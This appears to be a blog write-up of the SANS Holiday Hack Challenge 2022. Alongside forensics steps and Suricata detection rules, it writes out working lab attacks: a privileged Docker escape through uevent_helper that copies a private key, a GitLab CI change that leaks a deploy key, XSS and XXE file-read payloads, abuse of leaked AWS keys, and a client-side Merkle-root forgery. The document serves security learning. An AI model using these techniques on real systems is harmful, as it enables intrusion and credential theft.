---
layout: post
title: "SANS Holiday Hack Challange 2022: Writeup"
date: 2023-01-07 12:00
type: post
published: true
comments: true
categories: ctf
---

This is my write-up for the [SANS Holiday Hack Challenge 2022](https://holidayhackchallenge.com/2022).

## Main Objectives

The first part of the objective is an introduction where you are told about how your badge work, how the terminal works and a tutorial on setting up your wallet. It also establishes the backstory and sends you down in the underground tunnels. After this is completed there are five main objective chapters, each containing a few challenges.

### Recover the Tolkien Ring

The first chapter is to recover the Tolkien Ring. This chapter revolves around DFIR.

#### Wireshark Practice

The first challenge is a terminal where you get [a PCAP](https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap) and need to answer a few questions about the traffic.

To answer the first question, we look at the traffic, see that there is a lot of HTTP traffic and then go to `File` -> `Export objects` -> `HTTP` to export them. We can then find the answer to the second question by looking at the list of files to export and sort by size to find `app.php`. To find the answer to the third question we look at that same entry in the objects list and see that it starts at packet `687`. By looking at this packet in the list we can answer the fourth question. Note that this packet is the first packet of the response so the IP address of the web server is the source address of this packet: `192.185.57.242`. Looking at the contents of this `app.php` file we find a line at the end of the javascript block referencing `Ref_Sept24-2020.zip`. For the sixth question we can filter the packets for `tls` and look at the "Server Hello" packets for certificates. There are not that many entries so we can quickly go through them manually and find, apart from the legitimate Microsoft certificates, two other countries: `SS` and `IL` which translate into the answer `Israel, South Sudan`. Finally, the answer to the last question is obviously: `yes` the host is infected.

In summary these are the questions and answers to complete the terminal:

0. Can you help me? *yes*
1. There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP? *http*
2. What is the file name of the largest file we can export? *app.php*
3. What packet number starts that app.php file? *687*
4. What is the IP of the Apache server? *192.185.57.242*
5. What file is saved to the infected host? *Ref_Sept24-2020.zip*
6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea). *Israel, South Sudan*
7. Is the host infected (Yes/No)? *yes*

#### Windows Event Logs

In this challenge we get [a Windows event log](https://storage.googleapis.com/hhc22_player_assets/powershell.evtx) with some suspicious entries. We can start by converting the logfile into a human-readable format. This can be done with python-evtx:

{% highlight bash %}
pip install python-evtx
evtx_dump.py powershell.evtx > powershell.evtx.xml
{% endhighlight %}

The rest of the analysis is done mostly by using grep on this XML file. We note that there are a lot of events related to powershell activity. One of the tags present is `<Data Name="ScriptBlockText">` containing the executed script. We can perform some initial triage by grepping for `ScriptBlockText` and browsing through the various commands. Doing this we find a lot of suspicious activity on `2022-12-24`. Looking at the strange commands in that day we see that they read a file called `Recipe`. Looking at the commands and searching for `Get-Content` and `recipe` we find multiple commands of interest for the third question. The one that follows the exact description of the question is: `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}`. To answer the next question we can search for the variable `$foo` and find commands that match the description. By doing this we find: `$foo | Add-Content -Path 'Recipe'`. If we search for that command in the log we find a similar command having been run multiple times against `Recipe.txt` which answers question 5. By searching for commands such as `del` and `rm` in the log we find execution like `del .\Recipe.txt` so files have indeed been deleted and the answer to question 6 is "yes". However, looking at the deletion commands we do not find anything relating to `Recipe`. Additionally, looking for `Recipe` we see no deletion looking command so the answer to question 7 is "no". By looking at the full entry corresponding to the deletion command we can find event id 4104. We can also conclude from the replacement command that the secret ingredient is "honey" and that it has been compromised. Therefore we have the information to answer the final three questions and solve the terminal.

In summary these are the questions and answers to complete the terminal:

0. Are you ready to begin? *yes*
1. What month/day/year did the attack take place? For example, 09/05/2021. *12/24/2022*
2. An attacker got a secret from a file. What was the original file's name? *Recipe*
3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. *$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}*
4. After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action. *$foo | Add-Content -Path 'Recipe'*
5. The attacker ran the previous command against a file multiple times. What is the name of this file? *Recipe.txt*
6. Were any files deleted? (Yes/No) *yes*
7. Was the original file (from question 2) deleted? (Yes/No) *no*
8. What is the Event ID of the log that shows the actual command line used to delete the file? *4104*
9. Is the secret ingredient compromised (Yes/No)? *yes*
10. What is the secret ingredient? *honey*

#### Suricata Regatta

In this challenge we are tasked with writing a number of Suricata rules to capture some packets. To understand the various fields we have available for the different protocols we can reference the [Suricata documentation on rules](https://suricata.readthedocs.io/en/suricata-6.0.0/rules/). The first rule should capture DNS lookups for the domain "adv.epostoday.uk". The important parts of this rule is to check for udp on port 53 and then use the "dns.query" flag with content set to "adv.epostoday.uk". The second rule should capture http traffic between the host "192.185.57.242" and the internal network. The important parts here are using "<>" to capture packets in both directions and using the "$HOME_NET" variable to capture the whole home net. For the third rule we want to find TLS certificates for the host "CN=heardbellith.Icanwepeh.nagoya". The important parts of this rule are using the "tls" protocol and then the "tls.cert_sibject" flag with content "CN=heardbellith.Icanwepeh.nagoya". Finally the last rule requires us to find the javscript snippet "let byteCharacters = atob". The important parts here are that we look for http traffic and then use the "http.response_body" flag to get the full body whether it is compressed or not and then combine it with content "let byteCharacters = atob".

In summary, here are the four rules we need to write:

{% highlight bash %}
alert udp any any -> any 53 (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; sid:133701; rev:1;)
alert http 192.185.57.242 any <> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection"; sid:133702; rev:1;)
alert tls any any -> any any (msg:"Investigate bad certificates, possible Dridex infection"; tls.cert_subject; content:"CN=heardbellith.Icanwepeh.nagoya"; sid:133703; rev:1;)
alert http any any -> any any (msg:"Suspicious JavaScript function, possible Dridex infection"; http.response_body; content:"let byteCharacters = atob"; sid:133704; rev:1;)
{% endhighlight %}

With this done we have recovered the Tolkien Ring!

### Recover the Elfen Ring

The second chapter is to recover the Elfen Ring. This chapter revolves around DevOps topics.

#### Clone with a Difference

We are given the URI to a git repo which is supposed to be public: `git@haugfactory.com:asnowball/aws_scripts.git`. To be able to clone this we modify the URI into a https URL instead as is common with most popular git hosts: `https://haugfactory.com/asnowball/aws_scripts.git`. This way we can clone the repo and find the last word in the `README.md` file: `maintainers`.

#### Prison Escape

In this terminal we are tasked with escaping a Docker container. I followed [an excellent guide from the Snyk team](https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/) to find out that the container is running in "privileged" mode and then to escape it. In short, the final commands I used were:

{% highlight bash %}
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

cat <<EOF > /trigger.sh
#!/bin/sh
cp /home/jailer/.ssh/jail.key.priv $host_path/jail.key.priv
EOF
chmod +x /trigger.sh

echo "$host_path/trigger.sh" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /jail.key.priv
{% endhighlight %}

#### Jolly CI/CD

In this challenge we are inside a network of multiple hosts and have been given the address of a git repo. First we have to wait a bit for the infrastructure to come up and then clone the repo. We can do this by running:

{% highlight bash %}
until git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git; sleep 10; done
{% endhighlight %}

Once we have the repo, we can take a look at the commit log by running `git log`. There we find a commit with the message "whoops". If we check out the commit before that one, we find a private SSH key which we copy to another directory and set the appropriate permissions on.

{% highlight bash %}
git log
git checkout abdea0ebb21b156c01f7533cea3b895c26198c98 .ssh/.deploy
git checkout abdea0ebb21b156c01f7533cea3b895c26198c98 .ssh/.deploy.pub
mkdir ~/keys
cp .ssh/.deploy ~/keys/
cp .ssh/.deploy.pub ~/keys/
chmod 600 ~/keys/*
{% endhighlight %}

We can then create an SSH config with that key and check out the repo but this time with credentials:

{% highlight bash %}
cat <<EOF > ~/.ssh/config
host gitlab.flag.net.internal
    IdentityFile ~/keys/.deploy
    IdentitiesOnly yes
EOF

git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
{% endhighlight %}

We can then add two steps to the CI/CD configuration to exfiltrate the deploy key by copying it to the webroot and making it world-readable. We can then push this new config, wait for a bit for it to be executed, download that key and connect to the webserver to get the flag.

{% highlight bash %}
cat <<EOF >> .gitlab-ci.yml
- scp -i /etc/gitlab-runner/hhc22-wordpress-deploy /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/html/key1.pem
- ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal "chmod 777 /var/www/html/key1.pem"
EOF
git config user.name "knee-oh"
git config user.email sporx@kringlecon.com
git add .
git commit -m "bug fix"
git push

curl -O ~/keys/deploy-key.pem wordpress.flag.net.internal/key1.pem
ssh -i ~/keys/deploy-key.pem root@wordpress.flag.net.internal "cat /flag.txt"
{% endhighlight %}

By doing this we recover the Elfen ring!

### Recover the Web Ring

The third chapter is to recover the Web Ring. This chapter, unsurprisingly, revolves around web topics.

#### Naughty IP

For the first four objectives we need to analyse a PCAP file to investigate some web-based attacks. First we need to find a naughty IP address. We can do this in Wireshark by going to the "conversations" window and sorting on number of packets to find the IP address "18.222.86.32" and by filtering on it we see that they have been doing some brute force login attacks.

#### Credential Mining

We can investigate this brute force more closely by filtering on "ip.addr==18.222.86.32 && http.request.method == POST" to find all HTTP POST requests from this IP and finding the first username tried: "alice".

#### 404 FTW

After the brute force login we need to find the first successful request. We can do this by filtering on the suspicious IP address and looking for HTTP responses with status code 200 among all packets after packet 21457: "ip.addr==18.222.86.32 && http.response.code == 200 && frame.number > 21457". We can then find the first successful response and go to the corresponding request to see that the URL was "http://www.toteslegit.us/proc".

#### IMDS, XXE, and Other Abbreviations

Finally we can find the XXE attack by looking at HTTP requests *originating* from the web server ip address "10.12.42.16" with this filter: "ip.src == 10.12.42.16 && http.request". This reveals the URL that was fetched: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance".

#### Open Boria Mine Door

The next challenge requires us to input some input to make the "circuits" connect from left to right.

* For the first one, check the source to find the string `@&@&&W&&W&&&&` which is a valid input.
* For the second one, we can inject a HTML div tag which covers the whole input box: 
{% highlight html %}
<div style="width:1000px; height:1000px; background-color:#fff;"></div>
{% endhighlight %}
* For the third one, we can inject some javascript to create a div like in the second one:

{% highlight html %}
<script>
d=document.createElement('div');
d.style="width:1000px;height:1000px;background-color:#00f";
document.body.appendChild(d);
</script>
{% endhighlight %}

#### Glamtariel's Fountain

For the last challenge we are supposed to navigate a strange web application. The intention of this challenge is to teach some ways you can interact with a web application, especially how XXE attacks work but unfortunately I don't think it was well designed at all. The steps to complete it is essentially:

First we interrogate both the fountain and Galadriel normally with all items until you get to the third batch. Then we change the JSON request into an XML request by changing the Content-Type header to "application/xml" and changing the body as shown below:

JSON body
{% highlight json %}
{
    "imgDrop":"img1",
    "who":"fountain",
    "reqType":"json"
}
{% endhighlight %}

XML body 
{% highlight xml %}
<?xml version="1.0"?>
<root>
    <imgDrop>img1</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
{% endhighlight %}

Now we add an XXE attack to the request and guess the path to the ringlist.

{% highlight xml %}
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
{% endhighlight %}

After that, we use the new URL you find to look at the hidden images and make new requests.

{% highlight xml %}
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]>
<root>
    <imgDrop>&xxe;</imgDrop>
    <reqType>xml</reqType>
    <who>princess</who>
</root>
{% endhighlight %}

Finally, we change which field you inject the entity into.

{% highlight xml %}
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]>
<root>
    <imgDrop>img1</imgDrop>
    <reqType>&xxe;</reqType>
    <who>princess</who>
</root>
{% endhighlight %}

This recovers the Web ring!

### Recover the Cloud Ring

The fourth chapter is to recover the Cloud ring. This chapter, again unsurprisingly, revolves around cloud topics.

#### AWS CLI Intro

In the first challenge we are tasked with configuring the AWS CLI tool. We can do this by running `aws configure` and inputting the data provided. Afterwards we can use `aws sts get-caller-identity` to see who we are authenticated as.

{% highlight bash %}
aws help
aws configure
> AKQAAYRKO7A5Q5XUY2IY
> qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf
> us-east-1
> 

aws sts help
aws sts get-caller-identity
{% endhighlight %}

This gives us back the following information and finishes the challenge:

{% highlight json %}
{
    "UserId": "AKQAAYRKO7A5Q5XUY2IY",
    "Account": "602143214321",
    "Arn": "arn:aws:iam::602143214321:user/elf_helpdesk"
}
{% endhighlight %}

#### Trufflehog Search

In this challenge we use Trufflehog to find secrets in a git repo:

{% highlight bash %}
trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
{% endhighlight %}

This gives us, among other things, the following result:

> Found unverified result 🐷🔑❓  
> Detector Type: AWS  
> Decoder Type: PLAIN  
> Raw result: AKIAAIDAYRANYAHGQOHD  
> Commit: 106d33e1ffd53eea753c1365eafc6588398279b5  
> File: put_policy.py  
> Email: asnowball <alabaster@northpolechristmastown.local>  
> Repository: https://haugfactory.com/asnowball/aws_scripts.git  
> Timestamp: 2022-09-07 07:53:12 -0700 -0700  
> Line: 6  

So the answer to the challenge is: `put_policy.py`

#### Exploitation via AWS CLI

Finally, in this challenge we combine the two previous challenges to recover a key, authenticate against it and then use various commands to traverse the various policies associated with our account to finally find that we have access to an S3 bucket and a Lambda function.

First we get the credentials like in the previous challenge:

{% highlight bash %}
trufflehog git https://haugfactory.com/asnowball/aws_scripts.git
git clone https://haugfactory.com/asnowball/aws_scripts.git
cd aws_scripts
git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
cat put_policty.py
{% endhighlight %}

Then we configure the AWS CLI like in the first challenge:

{% highlight bash %}
$ aws configure
AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
{% endhighlight %}

Finally we investigate various resources in the AWS API as prompted by the challenge:

{% highlight bash %}
$ aws sts get-caller-identity
{
    "UserId": "AIDAJNIAAQYHIAAHDDRA",
    "Account": "602123424321",
    "Arn": "arn:aws:iam::602123424321:user/haug"
}

$ aws iam list-attached-user-policies --user-name haug
{
    "AttachedPolicies": [
        {
            "PolicyName": "TIER1_READONLY_POLICY",
            "PolicyArn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
        }
    ],
    "IsTruncated": false
}

$ aws iam get-policy --user-name user/haug --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY
{
    "Policy": {
        "PolicyName": "TIER1_READONLY_POLICY",
        "PolicyId": "ANPAYYOROBUERT7TGKUHA",
        "Arn": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 11,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.",
        "CreateDate": "2022-06-21 22:02:30+00:00",
        "UpdateDate": "2022-06-21 22:10:29+00:00",
        "Tags": []
    }
}

$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "lambda:ListFunctions",
                        "lambda:GetFunctionUrlConfig"
                    ],
                    "Resource": "*"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUserPolicy",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::602123424321:user/${aws:username}"
                },
                {
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
                },
                {
                    "Effect": "Deny",
                    "Principal": "*",
                    "Action": [
                        "s3:GetObject",
                        "lambda:Invoke*"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-06-21 22:02:30+00:00"
    }
}

$ aws iam list-user-policies --user-name haug
{
    "PolicyNames": [
        "S3Perms"
    ],
    "IsTruncated": false
}

$ aws iam   get-user-policy --user-name haug --policy-name S3Perms
{
    "UserPolicy": {
        "UserName": "haug",
        "PolicyName": "S3Perms",
        "PolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:ListObjects"
                    ],
                    "Resource": [
                        "arn:aws:s3:::smogmachines3",
                        "arn:aws:s3:::smogmachines3/*"
                    ]
                }
            ]
        }
    },
    "IsTruncated": false
}

$ aws s3api list-objects --bucket smogmachines3
...

$ aws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "smogmachine_lambda",
            "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
            "Runtime": "python3.9",
...

$ aws lambda get-function-url-config --function-name smogmachine_lambda
{
    "FunctionUrl": "https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/",
    "FunctionArn": "arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda",
    "AuthType": "AWS_IAM",
    "Cors": {
        "AllowCredentials": false,
        "AllowHeaders": [],
        "AllowMethods": [
            "GET",
            "POST"
        ],
        "AllowOrigins": [
            "*"
        ],
        "ExposeHeaders": [],
        "MaxAge": 0
    },
    "CreationTime": "2022-09-07T19:28:23.808713Z",
    "LastModifiedTime": "2022-09-07T19:28:23.808713Z"
}
{% endhighlight %}

This nets us the Cloud ring!

### Recover the Burning Ring of Fire

The final chapter revolves around blockchains and smart contracts.

#### Buy a Hat

To solve the first challenge, we go to a KTM, approve a transfer of 10 KC to address 0x8bd9a48b6208c63Be1f33F0e263623cB2a354e75 by inputting that information together with our wallet key. We then we go to the hat machine and input our wallet id and the id of the hat to get the hat.

#### Blockchain Divination

To solve this challenge, we note the block id of the transaction in the previous challenge and then go to the blockchain explorer and enter this id. In this block we can see that the coins were transferred from address 0x8bd9a48b6208c63Be1f33F0e263623cB2a354e75 to address 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554 which is were the smart contract is located.

#### Exploit a Smart Contract

To solve the final challenge, we grab the list of existing owners from the gallery page, we then fetch [the tool written by QwertyPetabyte](https://github.com/QPetabyte/Merkle_Trees) and modify the allowlist in the code to include our address as well as the current owners' addresses.

{% highlight python %}
allowlist = [
    '0x6F3E81246fAb582B573cc6741CcA80354f14eEcf',
    '0xa1861E96DeF10987E1793c8f77E811032069f8E9',
    '0xb9aA688bB7A1B085f307bf9a11790BFD24C5D5C2',
    '0xc249927fb81bde4eA7B9Dc9e4c9E6F503F147fe2',
    '0x8153e0E5cabC22545A1fe4d0149C2Fdc486A8ad8',
    '0x7F7cAA97b73fD38d6740e59C159428509eE00082',
    '0x214Fee463D58D21954e75bdD93c386414e71A985'
]
{% endhighlight %}

We then calculate a new proof and Merkle root using this list. We can now go to the web app and submit the validation since the Merkle root is not provided by the server but instead sent from the client side as part of the request. We can therefore replace the root and input our generated proof and root to submit a valid claim of a token.

By doing this we recover the Burning Ring of Fire.

## Conclusion

Thanks to SANS for hosting another great edition of the Holiday Hack challenge. These challenges are very nice, especially for beginners as they cover a broad range of topics and there's almost always something to take away, even for an experienced person. I strongly recommend you to check out the next one if you get the opportunity to.
